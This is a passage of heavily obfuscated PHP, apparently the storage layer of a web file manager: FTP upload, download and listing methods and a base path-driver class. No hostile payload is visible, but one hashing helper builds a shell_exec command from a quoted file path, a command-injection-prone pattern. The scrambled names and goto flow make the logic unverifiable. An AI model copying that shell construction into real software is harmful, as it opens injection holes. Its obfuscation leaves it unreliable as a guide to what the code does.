"{$f‡‡ÚŸ±÷‚}\55{$E—„ ê£ô}"); } goto cÒ¡œÕÚ¸®; c¸´åÌ¯õ: } public function upload($aˆ¶áÙ‹ç, $dŞšî«õ‚, $D¬ƒôƒ¢½Ñ = false, $c›íĞèÊ¿ = REPEAT_REPLACE) { goto f‘À¯ôíÃ¾; f‘À¯ôíÃ¾: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($aˆ¶áÙ‹ç))) { return !1; } $aˆ¶áÙ‹ç = $this->iconvSystem($aˆ¶áÙ‹ç); goto BÍÖŒõ¾®Ù; b„¾¤Ô¥ì: if ($A‘Àë¿¿ Ç != FTP_FINISHED) { return !1; } return $this->getPathOuter($aˆ¶áÙ‹ç); goto cŸÑÅğæ¦¨; BÍÖŒõ¾®Ù: $dŞšî«õ‚ = $this->iconvSystem($dŞšî«õ‚); $A‘Àë¿¿ Ç = ftp_nb_put($this->connect, $aˆ¶áÙ‹ç, $dŞšî«õ‚, FTP_BINARY); while ($A‘Àë¿¿ Ç == FTP_MOREDATA) { $A‘Àë¿¿ Ç = ftp_nb_continue($this->connect); } goto b„¾¤Ô¥ì; cŸÑÅğæ¦¨: } public function download($F»…‡å£”‚, $b‰…±¥…ğ = '') { goto fù‘‘•ã¹; fù‘‘•ã¹: if (!$this->_isconn()) { return !1; } $eà¼÷ùÛ¤¹ = $this->pathFather($b‰…±¥…ğ); if (!IO::mkdir($eà¼÷ùÛ¤¹)) { return !1; } goto B©¼–Š‹‹È; B©¼–Š‹‹È: $F»…‡å£”‚ = $this->iconvSystem($F»…‡å£”‚); $b‰…±¥…ğ = $this->iconvSystem($b‰…±¥…ğ); $aÈ„©Ë‰“™ = ftp_nb_get($this->connect, $b‰…±¥…ğ, $F»…‡å£”‚, FTP_BINARY); goto fŞ”áËÖ¬µ; fŞ”áËÖ¬µ: while ($aÈ„©Ë‰“™ == FTP_MOREDATA) { $aÈ„©Ë‰“™ = ftp_nb_continue($this->connect); } if ($aÈ„©Ë‰“™ != FTP_FINISHED) { return !1; } return $this->iconvApp($b‰…±¥…ğ); goto AÁ–•¾ßò­; AÁ–•¾ßò­: } private function ftpList($A¤ŞêàŒ°°) { goto d¢ôÃ³Ğ¦©; cíù¢‰ãº¾: $A¤ŞêàŒ°° = rtrim($A¤ŞêàŒ°°, $Eù’»§è[8]) . $Eù’»§è[8]; $eğà¹Îßè° = @ftp_nlist($this->connect, $A¤ŞêàŒ°°); if ($eğà¹Îßè° === !1) { $eğà¹Îßè° = @ftp_rawlist($this->connect, $A¤ŞêàŒ°°); foreach ($eğà¹Îßè° as $b®Šìğã¨º => $dª—ÔôÑ³Ö) { $eğà¹Îßè°[$b®Šìğã¨º] = end(explode($Eù’»§è[1153], $dª—ÔôÑ³Ö)); } } goto dÙ©˜´ã“ø; dÙ©˜´ã“ø: $BÁ—……ƒ = array(); foreach ($eğà¹Îßè° as $A½®´Ã›’) { if ($A½®´Ã›’ == $Eù’»§è[93] || $A½®´Ã›’ == $Eù’»§è[1154]) { continue; } if (!strstr($A½®´Ã›’, $Eù’»§è[8])) { $A½®´Ã›’ = $A¤ŞêàŒ°° . ltrim($A½®´Ã›’, $Eù’»§è[8]); } $BÁ—……ƒ[] = $this->iconvApp($A½®´Ã›’); } return $BÁ—……ƒ; goto Cîß ¤ÉŸ‹; d¢ôÃ³Ğ¦©: $Eù’»§è =& $_SERVER[¢à]; if (!$this->isFolder($A¤ŞêàŒ°°)) { return !1; } @ftp_chdir($this->connect, $Eù’»§è[8]); goto cíù¢‰ãº¾; Cîß ¤ÉŸ‹: } private function recursionFtpFiles($dê‚Êà¹¿æ, &$Dá‰˜ƒÕßÈ) { $EÕ¹²ŒÇ¢“ =& $_SERVER[¢à]; if (!$this->_isconn()) { return !1; } if (!($e­¼åêƒä = $this->ftpList($dê‚Êà¹¿æ))) { return !1; } foreach ($e­¼åêƒä as $dê‚Êà¹¿æ) { if ($this->isFolder($dê‚Êà¹¿æ)) { $this->recursionFtpFiles($dê‚Êà¹¿æ, $Dá‰˜ƒÕßÈ); $Dá‰˜ƒÕßÈ[$EÕ¹²ŒÇ¢“[74]][] = $dê‚Êà¹¿æ; } else { $Dá‰˜ƒÕßÈ[$EÕ¹²ŒÇ¢“[73]][] = $dê‚Êà¹¿æ; } } } private function objectMeta($cÚã•Èàˆ˜) { goto CĞ¥õ‘°çÀ; CĞ¥õ‘°çÀ: $EàäŠ—Øˆ =& $_SERVER[¢à]; $cì£…ˆÆ£º = $EàäŠ—Øˆ[1155] . md5($cÚã•Èàˆ˜); $BÑ‰ëŒ¨¾ = Cache::get($cì£…ˆÆ£º); goto Cù„Ëø²Œã; Cù„Ëø²Œã: if ($BÑ‰ëŒ¨¾ !== null && $BÑ‰ëŒ¨¾ !== !1) { return $BÑ‰ëŒ¨¾; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $EàäŠ—Øˆ[8]); goto c«Œ‚«æó; c«Œ‚«æó: $a‚Ûé£ğàÖ = @ftp_size($this->connect, $this->iconvSystem($cÚã•Èàˆ˜)); if ($a‚Ûé£ğàÖ != -1) { $BÑ‰ëŒ¨¾ = array($EàäŠ—Øˆ[77] => $a‚Ûé£ğàÖ, $EàäŠ—Øˆ[29] => $EàäŠ—Øˆ[164]); } else { $F°  ÅÑÅì = @ftp_chdir($this->connect, $this->iconvSystem($cÚã•Èàˆ˜)); $BÑ‰ëŒ¨¾ = $F°  ÅÑÅì ? array($EàäŠ—Øˆ[77] => 0, $EàäŠ—Øˆ[29] => $EàäŠ—Øˆ[76]) : !1; } Cache::set($cì£…ˆÆ£º, $BÑ‰ëŒ¨¾, 0); goto bõ—·Úßñ; bõ—·Úßñ: return $BÑ‰ëŒ¨¾; goto cŒÌ ßº’»; cŒÌ ßº’»: } } goto BÄÅÛ†âğ; Fªô”ğ‘÷…: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $Bà¿ĞµƒÉ =& $_SERVER[¢à]; $this->objectDriver = array($Bà¿ĞµƒÉ[57], $Bà¿ĞµƒÉ[58], $Bà¿ĞµƒÉ[59], $Bà¿ĞµƒÉ[60], $Bà¿ĞµƒÉ[61], $Bà¿ĞµƒÉ[62], $Bà¿ĞµƒÉ[63], $Bà¿ĞµƒÉ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Eé³ë‘Ò’) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Eé³ë‘Ò’, $_SERVER[¢à][8]); } return $Eé³ë‘Ò’; } public function getPathName($Då—ù…×Ğ) { return $Då—ù…×Ğ; } public function iconvApp($BŸº‡¶Ò‹) { return $BŸº‡¶Ò‹; } public function iconvSystem($eº¢‚‡­„À) { return $eº¢‚‡­„À; } public function iconvTo($CÉÌíæÏŠ¿, $CÍÛ£®ÑŠˆ, $CÏˆ••øÜ—) { goto f¬Á‰àò‘ù; c’âËß–: $BòÄßïÍî¥ = $BòÄßïÍî¥ ? $BòÄßïÍî¥ : $CÉÌíæÏŠ¿; if (strstr($BòÄßïÍî¥, $dÁØ»²ŒÓÉ[69])) { $BòÄßïÍî¥ = str_replace($dÁØ»²ŒÓÉ[69], $dÁØ»²ŒÓÉ[70], $BòÄßïÍî¥); } $aóÉŠÅ„Ü[$CÍÛ£®ÑŠˆ . $dÁØ»²ŒÓÉ[66] . $CÏˆ••øÜ— . $dÁØ»²ŒÓÉ[67] . $CÉÌíæÏŠ¿] = $BòÄßïÍî¥; goto bôÌ¯˜Çªô; f¬Á‰àò‘ù: $dÁØ»²ŒÓÉ =& $_SERVER[¢à]; if (!$CÉÌíæÏŠ¿ || !function_exists($dÁØ»²ŒÓÉ[65])) { return $CÉÌíæÏŠ¿; } static $aóÉŠÅ„Ü = array(); goto A¶«¼æÀÏï; bôÌ¯˜Çªô: $aóÉŠÅ„Ü[$CÏˆ••øÜ— . $dÁØ»²ŒÓÉ[66] . $CÍÛ£®ÑŠˆ . $dÁØ»²ŒÓÉ[67] . $CÉÌíæÏŠ¿] = $CÉÌíæÏŠ¿; $aóÉŠÅ„Ü[$CÏˆ••øÜ— . $dÁØ»²ŒÓÉ[66] . $CÍÛ£®ÑŠˆ . $dÁØ»²ŒÓÉ[67] . $BòÄßïÍî¥] = $CÉÌíæÏŠ¿; $aóÉŠÅ„Ü[$CÍÛ£®ÑŠˆ . $dÁØ»²ŒÓÉ[66] . $CÏˆ••øÜ— . $dÁØ»²ŒÓÉ[67] . $BòÄßïÍî¥] = $BòÄßïÍî¥; goto C†¸÷‚£¦’; C†¸÷‚£¦’: return $BòÄßïÍî¥; goto dÌàŠ§´è; A¶«¼æÀÏï: $f‡İĞ½™ = $CÍÛ£®ÑŠˆ . $dÁØ»²ŒÓÉ[66] . $CÏˆ••øÜ— . $dÁØ»²ŒÓÉ[67] . $CÉÌíæÏŠ¿; if (isset($aóÉŠÅ„Ü[$f‡İĞ½™])) { return $aóÉŠÅ„Ü[$f‡İĞ½™]; } if (function_exists($dÁØ»²ŒÓÉ[68])) { $BòÄßïÍî¥ = @mb_convert_encoding($CÉÌíæÏŠ¿, $CÏˆ••øÜ—, $CÍÛ£®ÑŠˆ); } else { $BòÄßïÍî¥ = @iconv($CÍÛ£®ÑŠˆ, $CÏˆ••øÜ—, $CÉÌíæÏŠ¿); } goto c’âËß–; dÌàŠ§´è: } public function getPathInner($FÅ‹‹­Ìƒ) { $a’ƒà¬ß é = IO::init($FÅ‹‹­Ìƒ); return $a’ƒà¬ß é->path; } public function getPathOuter($c°Óâ°ç›è) { $FÉ¨âêËº² =& $_SERVER[¢à]; $EØ‚´®Ïç = strlen(trim($this->pathBase, $FÉ¨âêËº²[8])); $c°Óâ°ç›è = substr(trim($c°Óâ°ç›è, $FÉ¨âêËº²[8]), $EØ‚´®Ïç); return $this->pathDriver . $FÉ¨âêËº²[8] . ltrim($c°Óâ°ç›è, $FÉ¨âêËº²[8]); } public function isParentOf($aÕÀ©®¥ì, $fíÄ½¤›š£) { $d³”†—µİ‰ =& $_SERVER[¢à]; $aÕÀ©®¥ì = rtrim(strtolower($aÕÀ©®¥ì), $d³”†—µİ‰[8]) . $d³”†—µİ‰[8]; $fíÄ½¤›š£ = rtrim(strtolower($fíÄ½¤›š£), $d³”†—µİ‰[8]) . $d³”†—µİ‰[8]; $BÕ¾±õÓ• = strpos($fíÄ½¤›š£, $aÕÀ©®¥ì) === 0; return $BÕ¾±õÓ•; } public function getType() { $C¹ğè‚á² =& $_SERVER[¢à]; $A‰½³±¿ôÀ = str_replace($C¹ğè‚á²[71], $C¹ğè‚á²[33], get_class($this)); return strtolower($A‰½³±¿ôÀ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($a©•­¸†¬é, $B‚ºå‚è¥¨) { $a†»É·‚Šâ =& $_SERVER[¢à]; $e‚ñî“¸¢á = rtrim($a©•­¸†¬é, $a†»É·‚Šâ[8]) . $a†»É·‚Šâ[8] . $B‚ºå‚è¥¨; $Eƒµœ•Ò¨ = $this->exist($e‚ñî“¸¢á); return $Eƒµœ•Ò¨ ? $e‚ñî“¸¢á : !1; } public function renameObject($fÊç™»Ò²Œ, $fŒŒ·²Ùö) { goto AéƒÊãË¨Ì; AéƒÊãË¨Ì: $AŸŸ‘»‰Şì =& $_SERVER[¢à]; $A£œÔˆ­Ç = $fŒŒ·²Ùö; Hook::trigger($AŸŸ‘»‰Şì[72], $this, $fÊç™»Ò²Œ, $this, $this->pathFather($fÊç™»Ò²Œ) . $fŒŒ·²Ùö); goto B”šĞª ÌÍ; C‘ÇŠô¯‘: return $C²é³¡©Æƒ ? $fŒŒ·²Ùö : !1; goto cÓà…¿Â; B”šĞª ÌÍ: $fÊç™»Ò²Œ = $this->getPathOuter($fÊç™»Ò²Œ); $fŒŒ·²Ùö = $this->pathFather($fÊç™»Ò²Œ) . $fŒŒ·²Ùö; if (IO::isFile($fÊç™»Ò²Œ)) { $C²é³¡©Æƒ = IO::copy($fÊç™»Ò²Œ, $this->pathFather($fÊç™»Ò²Œ), REPEAT_RENAME_FOLDER, $A£œÔˆ­Ç); if ($C²é³¡©Æƒ) { IO::remove($fÊç™»Ò²Œ); } } else { $C²é³¡©Æƒ = IO::mkdir($fŒŒ·²Ùö); if (!$C²é³¡©Æƒ) { return !1; } $C–µº‚èÛò = IO::listPath($fÊç™»Ò²Œ, !0); $D°Ü’‰…ã = array_merge($C–µº‚èÛò[$AŸŸ‘»‰Şì[73]], $C–µº‚èÛò[$AŸŸ‘»‰Şì[74]]); foreach ($D°Ü’‰…ã as $CÄ³åñ°“Ì) { IO::move($CÄ³åñ°“Ì[$AŸŸ‘»‰Şì[75]], $fŒŒ·²Ùö, REPEAT_RENAME_FOLDER); } IO::remove($fÊç™»Ò²Œ); } goto C‘ÇŠô¯‘; cÓà…¿Â: } public function tempFile($aªñ¾öì² = '', $EßØ´õÆŒ® = '') { goto FËñƒ“ƒÎ±; FËñƒ“ƒÎ±: if (!$aªñ¾öì²) { $aªñ¾öì² = rand_string(15); } $b´“óò‡Ìì = TEMP_FILES . rand_string(15) . $_SERVER[¢à][8]; @mkdir($b´“óò‡Ìì, 511, !0); goto dîÆÅ¬çŒˆ; dîÆÅ¬çŒˆ: $D´šñ£‰¨Æ = $b´“óò‡Ìì . $aªñ¾öì²; @touch($D´šñ£‰¨Æ); if ($EßØ´õÆŒ®) { file_put_contents($D´šñ£‰¨Æ, $EßØ´õÆŒ®); } goto Cè¦¢®ÕÂ²; Cè¦¢®ÕÂ²: return $D´šñ£‰¨Æ; goto bËö•–ŸÂÌ; bËö•–ŸÂÌ: } public function tempFileRemve($AìˆÖæ¹®¾) { @unlink($AìˆÖæ¹®¾); @rmdir($this->pathFather($AìˆÖæ¹®¾)); } public function mkfile($A¯æÕ‰©·Ğ, $b‚¶Ù‚ª„¿ = '', $dô¬Óğñ‰Ï = REPEAT_RENAME) { } public function mkdir($a¶“œ×Ê‰Ÿ, $f÷çŒ¤Ü†ï = REPEAT_SKIP) { } public function copyFile($aä¡ïéëâİ, $BˆÒÛ‚—É) { } public function moveFile($dÓ‡Ú³ï, $c¿œŒ°”¥Ô) { } public function remove($BêŸ¢ë‘ßÀ) { if ($this->isFile($BêŸ¢ë‘ßÀ)) { return $this->delFile($BêŸ¢ë‘ßÀ); } return $this->delFolder($BêŸ¢ë‘ßÀ); } public function rename($eà†ŒÛ›¸Ä, $C£ÙÊŒ¸›¤) { } public function exist($A³˜ÖŸÙ´©) { } public function findByHash($bĞÁË ÇŠË = '', $A†øæ¬¢ç™ = '') { return !1; } public function isFile($C°……éí‹­) { } public function isFolder($E¶Ä ‘‡¶ó) { } public function size($CîÉ‰Ë”Ìà) { } public function info($b¢ô³Ü) { } public function infoSimple($f¼ìŠˆŞÈ) { return $this->info($f¼ìŠˆŞÈ); } public function infoAuth($AÏÚÊ°Î°„) { return $this->info($AÏÚÊ°Î°„); } public function infoFull($AÎŒÆ­Í¾ß) { return $this->info($AÎŒÆ­Í¾ß); } public function infoWithChildren($F¶É×Ïßœ) { $fñĞ¯ßÉ–‘ =& $_SERVER[¢à]; $cğ˜è„ŞÍ„ = $this->info($F¶É×Ïßœ); if ($cğ˜è„ŞÍ„ && $cğ˜è„ŞÍ„[$fñĞ¯ßÉ–‘[29]] == $fñĞ¯ßÉ–‘[76]) { $B¢õôëÕøÀ = array($fñĞ¯ßÉ–‘[77] => 0, $fñĞ¯ßÉ–‘[78] => 0, $fñĞ¯ßÉ–‘[79] => 0); $this->infoChildren($F¶É×Ïßœ, $B¢õôëÕøÀ); $cğ˜è„ŞÍ„[$fñĞ¯ßÉ–‘[77]] = $B¢õôëÕøÀ[$fñĞ¯ßÉ–‘[77]]; $cğ˜è„ŞÍ„[$fñĞ¯ßÉ–‘[80]] = array($fñĞ¯ßÉ–‘[81] => $B¢õôëÕøÀ[$fñĞ¯ßÉ–‘[78]], $fñĞ¯ßÉ–‘[82] => $B¢õôëÕøÀ[$fñĞ¯ßÉ–‘[79]]); } return $cğ˜è„ŞÍ„; } public function listPath($dé¼³Êá°, $DŒÉ¥½óà = false) { } public function has($e¥½Ó¢îß, $CÑİÌ˜¾Û¤ = false, $FÍÆİƒñâ = false) { } public function canRead($eÌàºÃ­ ›) { } public function canWrite($d¸…§ÌÁ) { } public function getContent($DŞÁº¬²™‚) { } public function setContent($aã½İôÕù¼, $C»¼°¢–å¤ = '') { } protected function infoChildren($b¾åìï´ï, &$fï†–—Ò„ä) { $c¤è’ë¶± =& $_SERVER[¢à]; check_abort(); $Fæ®°ÍÈ’ = $this->listPath($b¾åìï´ï, !0); $Fæ®°ÍÈ’ = array_merge($Fæ®°ÍÈ’[$c¤è’ë¶±[74]], $Fæ®°ÍÈ’[$c¤è’ë¶±[73]]); foreach ($Fæ®°ÍÈ’ as $fŞé˜êÇ£â) { if ($fŞé˜êÇ£â[$c¤è’ë¶±[29]] == $c¤è’ë¶±[76]) { $fï†–—Ò„ä[$c¤è’ë¶±[79]]++; $dï¸‹ ôÓ‰ = $this->getPathInner($fŞé˜êÇ£â[$c¤è’ë¶±[75]]); $this->infoChildren($dï¸‹ ôÓ‰, $fï†–—Ò„ä); } else { $fï†–—Ò„ä[$c¤è’ë¶±[78]]++; $fï†–—Ò„ä[$c¤è’ë¶±[77]] += $fŞé˜êÇ£â[$c¤è’ë¶±[77]]; } } } public function fileSubstr($Aª†§ƒæãŞ, $f¶“‰ÑõÇò, $DğàÚã‚ç) { } public function listAll($dÄğÂÚãÇ) { } public function upload($dàé¹ÚçÓ, $b‡Ãºó††ø, $Eî§›´È˜ = false, $cëÀŒÆÌÖ” = REPEAT_REPLACE) { } public function uploadFileByID($AŞà§ÖÜ, $C±²ñæ£»š, $aâñÕò“ù) { } public function uploadFileByPath($E½õôÖøò¡, $eõ£óáŞ™î, $e‹å«³¹·¥ = array()) { } public function isUploadServer() { $D¿íÜé =& $_SERVER[¢à]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $D¿íÜé[83]) { return !0; } return $GLOBALS[$D¿íÜé[6]][$D¿íÜé[84]][$D¿íÜé[85]]; } public function isFileOutServer() { $FÀéê¤°íŠ =& $_SERVER[¢à]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $FÀéê¤°íŠ[83]) { return !0; } return $GLOBALS[$FÀéê¤°íŠ[6]][$FÀéê¤°íŠ[84]][$FÀéê¤°íŠ[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($F‹™ôÀ¶í÷) { $c†¯Öç÷“´ =& $_SERVER[¢à]; if (!$this->isCdnHost()) { return $F‹™ôÀ¶í÷; } return str_replace(trim(get_url_root($F‹™ôÀ¶í÷), $c†¯Öç÷“´[8]), trim($this->cdnHost, $c†¯Öç÷“´[8]), $F‹™ôÀ¶í÷); } public function uploadLink($A‘øÌä¸Ê, $D‰Ö‘Ñ´Š = 0) { goto c«©¸‰†¹Í; AÆê…Êªƒ²: if (!in_array($dŒ’¯ÈéÍ½, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $eöÇö‡ = 1024 * 1024 * 10; goto Dñ¶Ò¡ƒ’º; Dñ¶Ò¡ƒ’º: $F®¿‚öİ® = $D‰Ö‘Ñ´Š <= $eöÇö‡ ? $E–Ş»šôùê[87] : $E–Ş»šôùê[88]; $f·Ññ–•² = (!$D‰Ö‘Ñ´Š ? 1 : ceil($D‰Ö‘Ñ´Š / pow(1024, 3))) * 3600 * 4; $fÉ­ø‘½Î± = $this->{$F®¿‚öİ®}($A‘øÌä¸Ê, $f·Ññ–•²); goto Dñ…„’¹ˆ¡; c«©¸‰†¹Í: $E–Ş»šôùê =& $_SERVER[¢à]; if ($this->isUploadServer()) { return; } $dŒ’¯ÈéÍ½ = $this->getType(); goto AÆê…Êªƒ²; Dñ…„’¹ˆ¡: if ($fÉ­ø‘½Î±) { $fÉ­ø‘½Î±[$E–Ş»šôùê[89]] = $A‘øÌä¸Ê; $fÉ­ø‘½Î±[$E–Ş»šôùê[90]] = $dŒ’¯ÈéÍ½; } return $fÉ­ø‘½Î±; goto Bª¶ºÛ¼‹¹; Bª¶ºÛ¼‹¹: } public function uploadFormData($c·ÒÁ¶Šº’, $F×Ö…ø°ó = 3600) { } public function multiUploadFormData($c•­Å§ñÊ, $a—¢İäò = 3600) { } public function osChunkSize() { $CÉµÑœ×Ñ™ =& $_SERVER[¢à]; $FëÌ¦•®«Ê = (double) $GLOBALS[$CÉµÑœ×Ñ™[6]][$CÉµÑœ×Ñ™[84]][$CÉµÑœ×Ñ™[91]][$CÉµÑœ×Ñ™[92]]; if (!$FëÌ¦•®«Ê) { $FëÌ¦•®«Ê = 1024 * 84 * 10; } return $FëÌ¦•®«Ê; } public function download($E’ƒÒà¸ìÍ, $C†°ğå¼´ã) { } public function ext($aË¸ÌÕ‰¹) { $dæÑç­ÏÓ =& $_SERVER[¢à]; if (strpos($aË¸ÌÕ‰¹, $dæÑç­ÏÓ[8]) === -1) { $fè˜ç› = $aË¸ÌÕ‰¹; } else { $fè˜ç› = $this->pathThis($aË¸ÌÕ‰¹); } $bçÕÉ“’æ = $dæÑç­ÏÓ[33]; if (strstr($fè˜ç›, $dæÑç­ÏÓ[93])) { $bçÕÉ“’æ = substr($fè˜ç›, strrpos($fè˜ç›, $dæÑç­ÏÓ[93]) + 1); $bçÕÉ“’æ = strtolower($bçÕÉ“’æ); } if (strlen($bçÕÉ“’æ) > 3 && preg_match($dæÑç­ÏÓ[94], $bçÕÉ“’æ, $D­åï˜Ãµø)) { $bçÕÉ“’æ = $dæÑç­ÏÓ[33]; } return $bçÕÉ“’æ; } public function pathThis($FË¥ŞŒÇÀ¤) { $E•¾¡¤™¹Ö =& $_SERVER[¢à]; $FË¥ŞŒÇÀ¤ = str_replace($E•¾¡¤™¹Ö[95], $E•¾¡¤™¹Ö[8], rtrim($FË¥ŞŒÇÀ¤, $E•¾¡¤™¹Ö[8])); $Dòğğ“¤¶ = strrpos($FË¥ŞŒÇÀ¤, $E•¾¡¤™¹Ö[8]); if ($Dòğğ“¤¶ === !1) { return $FË¥ŞŒÇÀ¤; } return substr($FË¥ŞŒÇÀ¤, $Dòğğ“¤¶ + 1); } public function pathFather($EŒ‰©¥‘ÀÄ) { $a„ÄÔ–¬ =& $_SERVER[¢à]; $EŒ‰©¥‘ÀÄ = str_replace($a„ÄÔ–¬[95], $a„ÄÔ–¬[8], rtrim($EŒ‰©¥‘ÀÄ, $a„ÄÔ–¬[8])); $D›Áçå¦å = strrpos($EŒ‰©¥‘ÀÄ, $a„ÄÔ–¬[8]); if ($D›Áçå¦å === !1) { return $a„ÄÔ–¬[33]; } return substr($EŒ‰©¥‘ÀÄ, 0, $D›Áçå¦å + 1); } public function hashSimple($cÕèš‡¡Á) { goto c°Éˆ‹•¢ ; c°Éˆ‹•¢ : $f½åĞßÏô =& $_SERVER[¢à]; if (!$cÕèš‡¡Á) { return md5($f½åĞßÏô[33]); } $b´­¾ö“¥ä = $this->size($cÕèš‡¡Á); goto d¦•ê¤µ‹®; d¦•ê¤µ‹®: $Bõ‡‡ïÑ¼Ç = 200; $DÚÛ¤È‘•ñ = 50; if ($b´­¾ö“¥ä <= $Bõ‡‡ïÑ¼Ç * $DÚÛ¤È‘•ñ) { return $this->hashMd5($cÕèš‡¡Á) . $b´­¾ö“¥ä; } goto dÎŸÊ’óĞ›; bÌÀ„‡Õçô: $F£‘ÇéÕÏ… .= $this->fileSubstr($cÕèš‡¡Á, $b´­¾ö“¥ä - $Bõ‡‡ïÑ¼Ç, $Bõ‡‡ïÑ¼Ç); return md5($F£‘ÇéÕÏ…) . $b´­¾ö“¥ä; goto A‡ØÒ‰İÔ; dÎŸÊ’óĞ›: $E¸Æ©Ù¨ãÊ = intval($b´­¾ö“¥ä / $DÚÛ¤È‘•ñ); $F£‘ÇéÕÏ… = $f½åĞßÏô[33]; for ($A˜ÔØò©¡– = 0; $A˜ÔØò©¡– < $DÚÛ¤È‘•ñ; $A˜ÔØò©¡–++) { $F£‘ÇéÕÏ… .= $this->fileSubstr($cÕèš‡¡Á, $E¸Æ©Ù¨ãÊ * $A˜ÔØò©¡–, $Bõ‡‡ïÑ¼Ç); } goto bÌÀ„‡Õçô; A‡ØÒ‰İÔ: } public static $md5Cache = array(); public function hashMd5($B‘ö°º¾Ğ¢) { $B‘ö°º¾Ğ¢ = $this->iconvSystem($B‘ö°º¾Ğ¢); if (isset(self::$md5Cache[$B‘ö°º¾Ğ¢])) { return self::$md5Cache[$B‘ö°º¾Ğ¢]; } self::$md5Cache[$B‘ö°º¾Ğ¢] = $this->hashMd5Shell($B‘ö°º¾Ğ¢); if (!self::$md5Cache[$B‘ö°º¾Ğ¢]) { self::$md5Cache[$B‘ö°º¾Ğ¢] = @md5_file($B‘ö°º¾Ğ¢); } return self::$md5Cache[$B‘ö°º¾Ğ¢]; } private function hashMd5Shell($BğÍÚƒ¢ÖÏ) { goto AÎğƒñÅÌ²; bÙéƒ ï÷º: $F³Á½ìÏ³­ = shell_exec($aÑƒÕ†ê . "\x20\42{$BğÍÚƒ¢ÖÏ}\x22"); return substr($F³Á½ìÏ³­, 0, 32); goto c®ÆÑùò³; AÎğƒñÅÌ²: $e‚Ãéæ Êà =& $_SERVER[¢à]; if (!function_exists($e‚Ãéæ Êà[96])) { return !1; } $FÕ„øÄñ†¶ = array($e‚Ãéæ Êà[97], $e‚Ãéæ Êà[98]); goto dŠÏåääâ®; dŠÏåääâ®: $aÑƒÕ†ê = Cache::get($e‚Ãéæ Êà[99]); if (!$aÑƒÕ†ê) { $D†–º²‡¦ = BASIC_PATH . $e‚Ãéæ Êà[100]; $a™”§×ˆĞ = md5_file($D†–º²‡¦); $aÑƒÕ†ê = $e‚Ãéæ Êà[101]; foreach ($FÕ„øÄñ†¶ as $D•éËº‘Ä) { $F³Á½ìÏ³­ = shell_exec($D•éËº‘Ä . "\40\x22{$D†–º²‡¦}\x22"); if ($F³Á½ìÏ³­ && substr(trim($F³Á½ìÏ³­), 0, 32) == $a™”§×ˆĞ) { $aÑƒÕ†ê = $D•éËº‘Ä; break; } } Cache::set($e‚Ãéæ Êà[99], $aÑƒÕ†ê, 3600); } if ($aÑƒÕ†ê == $e‚Ãéæ Êà[101]) { return !1; } goto bÙéƒ ï÷º; c®ÆÑùò³: } public function link($AÓùÚ¹Ì‰ô) { return $AÓùÚ¹Ì‰ô; } public function fileOut($BÎó¬ÄÑø, $E”¶ØšÆ¥Ÿ = false, $cŸ¬ŠĞÆ¯ó = false, $d‡Ë–Û…É = '') { goto A—àòÈÔŞÛ; A—àòÈÔŞÛ: $Bµø–“î˜§ =& $_SERVER[¢à]; $this->cacheMethod(null, null); if (!$BÎó¬ÄÑø || !$this->exist($BÎó¬ÄÑø)) { show_json(LNG($Bµø–“î˜§[102]), !1, $cŸ¬ŠĞÆ¯ó); } goto EÃÛŸĞƒ; A°òô©îŒö: $e½º¹ŞÖó‚ = 0; if ($fµ×¶‘Ñ¦) { $e½º¹ŞÖó‚ = intval(1000 * 1000 * ($DÑ… ¾Å½˜ / $fµ×¶‘Ñ¦)); } while ($f¸‘Æ¦‰Œ <= $eŞíÒİƒÛ‰) { $e˜ŒìÉÂ¾ = timeFloat(); check_abort(); $d„öĞ‡©òÛ = $eŞíÒİƒÛ‰ - $f¸‘Æ¦‰Œ + 1; if ($d„öĞ‡©òÛ <= $DÑ… ¾Å½˜) { $DÑ… ¾Å½˜ = $d„öĞ‡©òÛ; } echo $this->fileSubstr($BÎó¬ÄÑø, $f¸‘Æ¦‰Œ, $DÑ… ¾Å½˜); $f¸‘Æ¦‰Œ += $DÑ… ¾Å½˜; if ($DÑ… ¾Å½˜ == $d„öĞ‡©òÛ) { $f¸‘Æ¦‰Œ = $eŞíÒİƒÛ‰ + 1; } if ($e½º¹ŞÖó‚) { $a™Â¸…¥óé = intval(1000 * 1000 * (timeFloat() - $e˜ŒìÉÂ¾)); $CÆÚ‰Ô‡Æò = $e½º¹ŞÖó‚ - $a™Â¸…¥óé; if ($CÆÚ‰Ô‡Æò > 5) { usleep($CÆÚ‰Ô‡Æò); } } } goto fªÒä¡¼Ä; Bî“¨í†ï: $bŞÌ‚›£Á¦ = strtolower($_SERVER[$Bµø–“î˜§[138]]); if ($dŸòˆ¥Ã«õ && $bŞÌ‚›£Á¦ && $Cù·í—åç) { if (strstr($bŞÌ‚›£Á¦, $Bµø–“î˜§[139])) { header($Bµø–“î˜§[140] . $BÎó¬ÄÑø); } else { if (strstr($bŞÌ‚›£Á¦, $Bµø–“î˜§[141])) { header($Bµø–“î˜§[142] . $BÎó¬ÄÑø); } else { if (strstr($bŞÌ‚›£Á¦, $Bµø–“î˜§[143])) { header($Bµø–“î˜§[144] . $BÎó¬ÄÑø); } } } if ($fµ×¶‘Ñ¦) { header($Bµø–“î˜§[145] . $fµ×¶‘Ñ¦); } return; } if (isset($_SERVER[$Bµø–“î˜§[146]])) { if (preg_match($Bµø–“î˜§[147], $_SERVER[$Bµø–“î˜§[146]], $FÖ‡ê…†Òï)) { $f¸‘Æ¦‰Œ = intval($FÖ‡ê…†Òï[1]); if (!empty($FÖ‡ê…†Òï[2])) { $eŞíÒİƒÛ‰ = intval($FÖ‡ê…†Òï[2]); } } header($Bµø–“î˜§[148]); header("\x43\157\x6e\x74\x65\156\164\55\x52\x61\156\x67\x65\x3a\x20\142\x79\x74\x65\163\40{$f¸‘Æ¦‰Œ}\55{$eŞíÒİƒÛ‰}\x2f" . $D£Â·Œòà); } else { header($Bµø–“î˜§[149]); } goto D±«Û¨œÃ; f²ÂÏ¼©Á: $f¸‘Æ¦‰Œ = 